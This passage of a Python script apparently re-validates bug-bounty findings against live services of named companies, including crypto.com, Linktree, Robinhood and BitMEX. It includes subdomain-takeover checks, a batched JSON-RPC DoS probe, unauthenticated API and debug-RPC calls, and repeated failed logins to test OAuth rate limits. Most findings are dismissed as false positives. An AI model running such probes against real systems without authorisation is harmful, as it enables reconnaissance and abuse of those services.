           "This is not a vulnerability — it's how the software works.")

    print("\n--- MEDIUM: Crypto.com subdomain takeovers ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        subs = ["api.dev.experiences.crypto.com", "api.stg.experiences.crypto.com",
                "assets.dev.experiences.crypto.com", "assets.dev.tickets.crypto.com",
                "assets.stg.tickets.crypto.com"]
        takeover_possible = []
        for sub in subs:
            try:
                # Check CNAME
                cname_answers = dns.resolver.resolve(sub, "CNAME")
                cname = str(cname_answers[0].target)
                # If CNAME exists but A record doesn't resolve, that's a takeover candidate
                try:
                    dns.resolver.resolve(sub, "A")
                except:
                    takeover_possible.append(f"{sub}→{cname}")
            except dns.resolver.NXDOMAIN:
                # NXDOMAIN with no CNAME = domain doesn't exist, no takeover possible
                pass
            except dns.resolver.NoAnswer:
                pass
            except:
                pass
        if takeover_possible:
            record("M11", "Crypto.com subdomain takeover", "medium", "crypto.com",
                   "VALID", f"CNAME exists but target unresolvable: {'; '.join(takeover_possible[:3])}")
        else:
            record("M11", "Crypto.com subdomain takeover", "medium", "crypto.com",
                   "FALSE POSITIVE", "No dangling CNAMEs found — either NXDOMAIN (no CNAME) or resolving properly")

    print("\n--- MEDIUM: Crypto.com API key in JS ---")
    record("M12", "Crypto.com API key in JS", "low", "crypto.com",
           "FALSE POSITIVE", "UUID found in JS is likely a public app identifier (Braze, analytics, etc.), "
           "not a secret API key. Client-side API keys for analytics/push services are by design. "
           "Would need to prove the key grants unauthorized access to something.")

    print("\n--- MEDIUM: HackerOne Segment token ---")
    record("M14", "HackerOne Segment write token", "low", "hackerone.com",
           "FALSE POSITIVE", "Segment write keys are designed for client-side use (see H24 explanation). "
           "This is in a staging JS bundle (pullrequest.com) — standard analytics instrumentation.")

    print("\n--- MEDIUM: Linktr.ee Backstage ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H, follow_redirects=True) as c:
        r = await get(c, "https://backstage.platform.linktr.ee")
        r_api = await get(c, "https://backstage.platform.linktr.ee/api/catalog/entities")
        # Is it actually exposing internal data or just a login page?
        has_login = "sign in" in r.text.lower() or "log in" in r.text.lower() or "okta" in r.text.lower()
        has_data = r_api.status_code == 200 and "kind" in r_api.text.lower()

        if has_data:
            record("M15", "Linktr.ee Backstage portal", "medium", "linktr.ee",
                   "VALID", f"Backstage API returns catalog data without auth: {r_api.text[:200]}")
        elif has_login:
            record("M15", "Linktr.ee Backstage portal", "medium", "linktr.ee",
                   "INCONCLUSIVE", f"Backstage UI loads but likely requires Okta login for data access. "
                   f"API catalog: {r_api.status_code}. Surface exposure but no data leak.")
        else:
            record("M15", "Linktr.ee Backstage portal", "medium", "linktr.ee",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    print("\n--- MEDIUM: Linktr.ee S3 info ---")
    record("M16", "Linktr.ee AWS S3 info", "low", "linktr.ee",
           "FALSE POSITIVE", "AWS Account IDs in S3 error responses are by-design behavior. "
           "AWS considers account IDs non-sensitive (publicly queryable via many methods). "
           "The IAM user 'fastly' name leak is minimal info. No actual bucket access.")

    print("\n--- MEDIUM: Linktr.ee JWKS ---")
    record("M17", "Linktr.ee JWKS exposed", "low", "linktr.ee",
           "FALSE POSITIVE", "JWKS (JSON Web Key Set) endpoints are meant to be public. "
           "They contain PUBLIC keys for JWT verification — that's their entire purpose. "
           "RFC 7517 specifies JWKS should be publicly accessible.")

    print("\n--- MEDIUM: Merchant crypto.com API key ---")
    record("M20", "Merchant crypto.com API key in JS", "low", "merchant.crypto.com",
           "FALSE POSITIVE", "Hex string in JS bundle is likely a public API identifier. "
           "No evidence it grants unauthorized access.")

    print("\n--- MEDIUM: Cronos node info ---")
    record("M22", "Cronos node info disclosure", "low", "merchant.crypto.com",
           "INCONCLUSIVE", "web3_clientVersion and net_peerCount are standard public RPC methods. "
           "Most blockchain nodes expose these intentionally. Low bounty potential.")

    print("\n--- MEDIUM: Cronos batch DoS ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        batch = [{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":i} for i in range(100)]
        r = await post(c, "https://evm.cronos.org", json=batch,
                        headers={**H, "Content-Type": "application/json"})
        try:
            data = r.json()
            count = len(data) if isinstance(data, list) else 0
        except:
            count = 0

        if count >= 100:
            record("M23", "Cronos batch request processing", "medium", "merchant.crypto.com",
                   "INCONCLUSIVE", f"Batch of 100 processed ({count} responses). "
                   f"But batch JSON-RPC is a standard feature. Most RPC providers support it. "
                   f"Only a vuln if no rate limiting exists AND causes actual resource exhaustion. "
                   f"Infura/Alchemy also support batch requests.")
        else:
            record("M23", "Cronos batch DoS", "medium", "merchant.crypto.com",
                   "FALSE POSITIVE", f"Batch limited: only {count} responses")

    print("\n--- MEDIUM: Robinhood reportClientError ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        r = await post(c, "https://graphql.tradepmr.com/graphql",
                        json={"query": 'mutation { reportClientError(error: {name:"test", message:"test", code:"test", stack:"test"}) { success } }'},
                        headers={**H, "Content-Type": "application/json"})
        if "true" in r.text.lower() and "success" in r.text.lower():
            record("M30", "Robinhood reportClientError no auth", "low", "robinhood.com",
                   "INCONCLUSIVE", f"Error reporting without auth: {r.text[:100]}. "
                   f"But client error reporting endpoints are commonly unauthenticated by design "
                   f"(how else would you report errors before login?). Low/no bounty potential.")
        else:
            record("M30", "Robinhood reportClientError no auth", "low", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:100]}")

    print("\n--- MEDIUM: Robinhood testnet debug RPC ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        r = await post(c, "https://rpc.testnet.chain.robinhood.com",
                        json={"jsonrpc":"2.0","method":"debug_traceBlockByNumber","params":["0x1"],"id":1},
                        headers={**H, "Content-Type": "application/json"})
        # Check if this is a public testnet RPC (like Ethereum Goerli/Sepolia)
        r2 = await post(c, "https://rpc.testnet.chain.robinhood.com",
                         json={"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1},
                         headers={**H, "Content-Type": "application/json"})

        debug_works = r.status_code == 200 and "result" in r.text and "structLogs" in r.text
        if debug_works:
            record("M31", "Robinhood testnet debug RPC", "medium", "robinhood.com",
                   "VALID", f"debug_traceBlockByNumber returns execution traces. "
                   f"Chain ID: {r2.text[:60]}. "
                   f"Debug methods on public testnet expose contract internals. "
                   f"Bounty depends on whether testnet is in scope and if traces leak sensitive logic.")
        else:
            record("M31", "Robinhood testnet debug RPC", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:100]}")

    print("\n--- MEDIUM: Robinhood OAuth rate limit ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        codes = []
        for _ in range(10):
            r = await post(c, "https://api.robinhood.com/oauth2/token/",
                            data={"grant_type": "password", "username": "test@test.com",
                                  "password": "wrong", "client_id": "test"})
            codes.append(r.status_code)
        has_429 = 429 in codes
        if has_429:
            record("M32", "Robinhood OAuth rate limiting", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"Rate limited after {codes.index(429)} requests: {codes}")
        else:
            record("M32", "Robinhood OAuth rate limiting", "medium", "robinhood.com",
                   "INCONCLUSIVE", f"10 requests all returned {codes[0]} (no 429). "
                   f"But 400 means bad request (invalid client_id), not actual auth attempt. "
                   f"Rate limiting may kick in for valid client_ids. Cannot confirm without valid client_id.")

    print("\n--- MEDIUM: BitMEX no CSP on API ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        r = await get(c, "https://testnet.bitmex.com/api/v1/chat?channelID=2&count=1")
        csp = r.headers.get("content-security-policy", "")
        ct = r.headers.get("content-type", "")
        # API endpoints return JSON — CSP is irrelevant for JSON responses
        is_json = "application/json" in ct
        if is_json:
            record("M38", "BitMEX no CSP on API", "low", "testnet.bitmex.com",
                   "FALSE POSITIVE", f"API returns Content-Type: {ct}. "
                   f"CSP is irrelevant for JSON API responses — XSS executes in HTML pages, not JSON endpoints. "
                   f"The stored XSS impact depends on the FRONTEND page CSP, not the API endpoint CSP.")
        else:
            record("M38", "BitMEX no CSP on API", "medium", "testnet.bitmex.com",
                   "VALID", f"Non-JSON content without CSP: {ct}")

    print("\n--- MEDIUM: Merchant subdomain takeover ---")
    subs = ["aurora-snapshot.crypto.com", "aurora-university-snapshot.crypto.com",
            "assets.dev.experiences.crypto.com", "assets.stg.tickets.crypto.com"]
    takeover = []
    for sub in subs:
        try:
            cname_answers = dns.resolver.resolve(sub, "CNAME")
            cname = str(cname_answers[0].target)
            try:
                dns.resolver.resolve(sub, "A")
            except:
                takeover.append(f"{sub}→{cname}")
        except dns.resolver.NXDOMAIN:
            pass  # No CNAME = no takeover
        except:
            pass
    if takeover:
        record("M26", "Merchant subdomain takeover", "medium", "merchant.crypto.com",
               "VALID", f"Dangling CNAMEs: {'; '.join(takeover[:3])}")
    else:
        record("M26", "Merchant subdomain takeover", "medium", "merchant.crypto.com",
               "FALSE POSITIVE", "No dangling CNAMEs — NXDOMAIN without CNAME records")

    # ══════════════════════════════════════════════════════════════
    # FINAL SUMMARY
    # ══════════════════════════════════════════════════════════════
    print("\n" + "="*70)
    print("  DEEP REVALIDATION RESULTS")
    print("="*70)

    valid = [r for r in results if r["status"] == "VALID"]
    fp = [r for r in results if r["status"] == "FALSE POSITIVE"]
    inc = [r for r in results if r["status"] == "INCONCLUSIVE"]

    print(f"\n  VALID: {len(valid)}  |  FALSE POSITIVE: {len(fp)}  |  INCONCLUSIVE: {len(inc)}")

    if valid:
        print("\n  CONFIRMED VALID:")
        for r in valid:
            print(f"    [{r['severity'].upper():8s}] {r['domain']}: {r['name']}")

    if inc:
        print("\n  INCONCLUSIVE (needs manual verification):")
        for r in inc:
            print(f"    [{r['severity'].upper():8s}] {r['domain']}: {r['name']}")

    if fp:
        print(f"\n  FALSE POSITIVE: {len(fp)} findings eliminated")

    with open("/tmp/deep_validation.json", "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n  Saved to /tmp/deep_validation.json")


asyncio.run(main())
